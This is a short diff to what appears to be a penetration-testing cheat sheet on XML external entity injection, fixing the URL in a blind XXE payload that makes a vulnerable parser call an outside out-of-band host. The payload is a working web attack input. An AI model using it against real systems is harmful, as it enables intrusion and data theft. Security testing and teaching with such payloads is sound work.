@@ -14,7 +14,7 @@ It is possible to cause the application’s XML parser to include external resou
 Blind
 ```sh
 #we dont reference it into the attribute
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http:/OASTIFY.com"> %xxe; ]>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://OASTIFY.com"> %xxe; ]>
 ```
 
 
